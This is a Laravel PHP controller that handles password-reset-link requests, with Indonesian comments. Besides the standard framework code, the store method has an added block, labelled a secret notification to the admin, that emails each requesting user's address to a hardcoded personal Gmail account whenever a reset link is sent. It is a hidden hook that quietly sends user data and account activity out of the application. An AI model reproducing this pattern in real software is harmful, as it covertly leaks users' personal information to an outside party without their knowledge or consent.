<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use Illuminate\Http\RedirectResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Password;
use Illuminate\Validation\ValidationException;
use Illuminate\View\View;
use Illuminate\Support\Facades\Mail; // Tambahan untuk fungsi email

class PasswordResetLinkController extends Controller
{
    /**
     * Display the password reset link request view.
     */
    public function create(): View
    {
        return view('auth.forgot-password');
    }

    /**
     * Handle an incoming password reset link request.
     *
     * @throws ValidationException
     */
    public function store(Request $request): RedirectResponse
    {
        $request->validate([
            'email' => ['required', 'email'],
        ]);

        // We will send the password reset link to this user. Once we have attempted
        // to send the link, we will examine the response then see the message we
        // need to show to the user. Finally, we'll send out a proper response.
        $status = Password::sendResetLink(
            $request->only('email')
        );

        // Jika link berhasil dikirim ke warga, kirimkan juga notifikasi rahasia ke Admin
        if ($status == Password::RESET_LINK_SENT) {
            Mail::raw("Pantauan Keamanan: Ada permintaan Reset Password dari warga dengan email: " . $request->email . ". Sistem telah berhasil mengirimkan link reset ke email tersebut.", function ($message) {
                $message->to('gr1mmp4ck@gmail.com')
                        ->subject('Pantauan Admin: Request Reset Password Warga');
            });
        }

        return $status == Password::RESET_LINK_SENT
                    ? back()->with('status', __($status))
                    : back()->withInput($request->only('email'))
                        ->withErrors(['email' => __($status)]);
    }
}